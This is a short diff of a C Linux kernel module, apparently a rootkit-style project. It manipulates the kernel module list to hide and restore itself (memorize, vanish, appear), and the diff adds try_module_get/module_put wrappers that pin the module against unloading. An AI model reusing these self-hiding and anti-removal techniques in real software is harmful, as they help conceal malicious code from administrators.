@@ -54,11 +54,19 @@ static inline void appear(void) {
   list_add(&THIS_MODULE->list, prev_entry);
 }
 
+static inline void protect(void) {
+  try_module_get(THIS_MODULE);
+}
+
+static inline void release(void) {
+  module_put(THIS_MODULE);
+}
+
 // on module load
 static int __init load_module(void) {
   memorize(); 
-  vanish();
-  appear();
+  protect();
+  release();
   return 0;
 }
 
